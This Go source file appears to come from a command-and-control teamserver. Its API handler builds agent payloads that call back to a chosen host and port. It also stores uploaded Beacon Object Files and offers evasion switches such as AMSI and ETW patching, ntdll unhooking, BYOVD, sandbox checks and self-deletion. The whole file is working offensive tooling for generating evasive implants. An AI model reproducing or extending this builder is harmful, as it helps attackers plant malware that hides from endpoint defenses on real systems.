package api

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/rs/zerolog/log"

	"apex/teamserver/internal/builder"
	"apex/teamserver/internal/listeners"
)

// PayloadHandler builds and serves agent payloads and manages BOF storage.
type PayloadHandler struct {
	listeners *listeners.Manager
	agentDir  string
	bofDir    string
	bofMu     sync.RWMutex
	bofs      []BOFEntry
}

type BOFEntry struct {
	ID         string `json:"id"`
	Name       string `json:"name"`
	Size       int64  `json:"size"`
	Hash       string `json:"hash"`
	UploadedAt string `json:"uploaded_at"`
	FilePath   string `json:"-"`
}

func NewPayloadHandler(mgr *listeners.Manager, agentDir string) *PayloadHandler {
	if agentDir == "" {
		agentDir = "agent"
	}

	bofDir := filepath.Join(agentDir, "..", "data", "bofs")
	os.MkdirAll(bofDir, 0755)

	h := &PayloadHandler{
		listeners: mgr,
		agentDir:  agentDir,
		bofDir:    bofDir,
		bofs:      make([]BOFEntry, 0),
	}

	h.loadExistingBOFs()
	return h
}

func (h *PayloadHandler) loadExistingBOFs() {
	entries, err := os.ReadDir(h.bofDir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(e.Name()))
		if ext != ".o" && ext != ".obj" {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		h.bofs = append(h.bofs, BOFEntry{
			ID:         uuid.New().String(),
			Name:       e.Name(),
			Size:       info.Size(),
			UploadedAt: info.ModTime().Format(time.RFC3339),
			FilePath:   filepath.Join(h.bofDir, e.Name()),
		})
	}
	log.Info().Int("count", len(h.bofs)).Msg("Loaded existing BOFs")
}

// GenerateRequest mirrors the client's payload configuration.
type GenerateRequest struct {
	Platform           string   `json:"platform"` // "windows" | "linux" | "macos"
	OutputFormat       string   `json:"output_format"`
	ListenerID         string   `json:"listener_id"`
	CallbackHost       string   `json:"callback_host"`
	CallbackPort       int      `json:"callback_port"`
	ProfileName        string   `json:"profile_name"`
	// Windows evasion
	SleepObfuscation   bool     `json:"sleep_obfuscation"`
	SleepMethod        string   `json:"sleep_method"`
	EncryptedShellcode bool     `json:"encrypted_shellcode"`
	EncryptionMethod   string   `json:"encryption_method"`
	UnhookNtdll        bool     `json:"unhook_ntdll"`
	ETWPatch           bool     `json:"etw_patch"`
	AMSIPatch          bool     `json:"amsi_patch"`
	HardwareBreakpoint bool     `json:"hardware_breakpoint"`
	BYOVD              bool     `json:"byovd"`
	BOFIDs             []string `json:"bof_ids"`
	// POSIX evasion (Linux/macOS)
	AntiDebug    bool `json:"anti_debug"`
	ProcMask     bool `json:"proc_mask"`
	SelfDelete   bool `json:"self_delete"`
	EnvClean     bool `json:"env_clean"`
	SandboxCheck bool `json:"sandbox_check"`
}

type GenerateResponse struct {
	Success       bool   `json:"success"`
	Message       string `json:"message"`
	PayloadBase64 string `json:"payload_base64,omitempty"`
	Filename      string `json:"filename,omitempty"`
}

func (h *PayloadHandler) Generate(w http.ResponseWriter, r *http.Request) {
	var req GenerateRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	if req.ListenerID == "" {
		writeError(w, http.StatusBadRequest, "listener_id required")
		return
	}

	l, ok := h.listeners.Get(req.ListenerID)
	if !ok {
		writeError(w, http.StatusNotFound, "listener not found")
		return
	}

	c2Host := strings.TrimSpace(req.CallbackHost)
	if c2Host == "" {
		c2Host = l.BindAddress()
		if c2Host == "" || c2Host == "0.0.0.0" {
			c2Host = "127.0.0.1"
		}
	}
	c2Port := req.CallbackPort
	if c2Port <= 0 {
		c2Port = l.BindPort()
	}
	if c2Port <= 0 {
		c2Port = 8080
	}
	useHTTPS := l.Protocol() == listeners.ProtocolHTTPS

	platform := builder.Platform(strings.ToLower(req.Platform))
	if platform == "" {
		platform = builder.PlatformWindows
	}

	evasion := &builder.EvasionOpts{
		SleepObfuscation: req.SleepObfuscation,
		UnhookNtdll:      req.UnhookNtdll,
		ETWPatch:         req.ETWPatch,
		AMSIPatch:        req.AMSIPatch,
	}

	posixEvasion := &builder.PosixEvasionOpts{
		AntiDebug:    req.AntiDebug,
		ProcMask:     req.ProcMask,
		SelfDelete:   req.SelfDelete,
		EnvClean:     req.EnvClean,
		SandboxCheck: req.SandboxCheck,
	}

	log.Info().
		Str("platform", string(platform)).
		Str("format", req.OutputFormat).
		Msg("Building agent payload")

	b64, filename, err := builder.BuildBase64(h.agentDir, platform, req.OutputFormat, c2Host, c2Port, useHTTPS, evasion, posixEvasion)
	if err != nil {
		writeError(w, http.StatusInternalServerError, "build failed: "+err.Error())
		return
	}

	writeJSON(w, http.StatusOK, GenerateResponse{
		Success:       true,
		Message:       "Payload built successfully",
		PayloadBase64: b64,
		Filename:      filename,
	})
}

// BOF management

func (h *PayloadHandler) ListBOFs(w http.ResponseWriter, _ *http.Request) {
	h.bofMu.RLock()
	defer h.bofMu.RUnlock()
	writeJSON(w, http.StatusOK, h.bofs)
}

func (h *PayloadHandler) UploadBOF(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(10 << 20); err != nil {
		writeError(w, http.StatusBadRequest, "invalid multipart form")
		return
	}

	file, header, err := r.FormFile("bof")
	if err != nil {
		writeError(w, http.StatusBadRequest, "missing 'bof' file field")
		return
	}
	defer file.Close()

	ext := strings.ToLower(filepath.Ext(header.Filename))
	if ext != ".o" && ext != ".obj" {
		writeError(w, http.StatusBadRequest, "only .o or .obj files accepted")
		return
	}

	data, err := io.ReadAll(io.LimitReader(file, 10<<20))
	if err != nil {
		writeError(w, http.StatusInternalServerError, "read failed")
		return
	}

	hash := fmt.Sprintf("%x", sha256.Sum256(data))
	id := uuid.New().String()
	savePath := filepath.Join(h.bofDir, id+ext)
	if err := os.WriteFile(savePath, data, 0644); err != nil {
		writeError(w, http.StatusInternalServerError, "save failed: "+err.Error())
		return
	}

	entry := BOFEntry{
		ID:         id,
		Name:       header.Filename,
		Size:       int64(len(data)),
		Hash:       hash[:16],
		UploadedAt: time.Now().Format(time.RFC3339),
		FilePath:   savePath,
	}

	h.bofMu.Lock()
	h.bofs = append(h.bofs, entry)
	h.bofMu.Unlock()

	log.Info().Str("id", id).Str("name", header.Filename).Int("size", len(data)).Msg("BOF uploaded")
	writeJSON(w, http.StatusOK, entry)
}

func (h *PayloadHandler) GetBOFData(id string) ([]byte, error) {
	h.bofMu.RLock()
	defer h.bofMu.RUnlock()
	for _, b := range h.bofs {
		if b.ID == id {
			return os.ReadFile(b.FilePath)
		}
	}
	return nil, fmt.Errorf("BOF not found: %s", id)
}

func (h *PayloadHandler) DeleteBOF(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")
	if id == "" {
		writeError(w, http.StatusBadRequest, "missing id")
		return
	}

	h.bofMu.Lock()
	defer h.bofMu.Unlock()
	for i, b := range h.bofs {
		if b.ID == id {
			os.Remove(b.FilePath)
			h.bofs = append(h.bofs[:i], h.bofs[i+1:]...)
			writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
			return
		}
	}
	writeError(w, http.StatusNotFound, "BOF not found")
}
